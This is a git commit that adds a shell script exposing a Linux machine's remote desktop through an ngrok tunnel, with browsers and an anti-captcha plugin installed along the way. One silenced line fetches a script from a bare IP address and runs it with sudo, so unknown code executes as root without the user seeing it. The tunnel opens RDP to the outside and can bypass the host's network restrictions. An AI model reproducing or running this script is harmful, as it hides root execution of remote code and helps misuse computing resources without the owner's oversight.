d639a6732cdf97d23601c47e3f5d5b7edf98196a
joykotest <106002787+joykotest@users.noreply.github.com>
2022-05-26 02:49:03 +0000

    Create v2rmpc.sh

---
+++ v2rmpc.sh
@@ -0,0 +1,40 @@
+echo "Download ngrok"
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
+unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
+unzip ngrok-stable-linux-amd64.zip.1 > /dev/null 2>&1
+read -p "Ctrl + V Authtoken: " CRP 
+./ngrok authtoken $CRP 
+nohup ./ngrok tcp 3389 &>/dev/null &
+echo Downloading File 
+echo "===================================="
+echo "Wait 2 Minutes"
+echo "===================================="
+sudo apt-get update > /dev/null 2>&1
+echo "===================================="
+echo "Chrome"
+echo "===================================="
+sudo wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb > /dev/null 2>&1
+sudo apt install ./google-chrome-stable_current_amd64.deb > /dev/null 2>&1
+sudo wget https://antcpt.com/downloads/anticaptcha/chrome/anticaptcha-plugin_v0.61.zip > /dev/null 2>&1
+echo "===================================="
+echo "Install Firefox"
+echo "===================================="
+sudo apt install firefox -y > /dev/null 2>&1
+echo "===================================="
+echo "Install Plugin"
+echo "===================================="
+sudo wget http://199.250.207.182/~ngewetech/nah/ext.sh -O /home/admin/ext.sh > /dev/null 2>&1 && cd /home/admin && sudo sh ext.sh > /dev/null 2>&1
+echo "Install RDP"
+echo "===================================="
+sudo apt install -y xrdp > /dev/null 2>&1
+sudo apt install xfce4 -y > /dev/null 2>&1
+sudo apt-get install xfce4 xfce4-terminal -y > /dev/null 2>&1
+echo "===================================="
+echo "Start RDP"
+echo "===================================="
+sudo sed -i.bak '/fi/a xfce4-session \n' /etc/xrdp/startwm.sh > /dev/null 2>&1
+sudo service xrdp start > /dev/null 2>&1
+echo XRDP Address:
+curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p'
+echo "===================================="
+sleep 43210
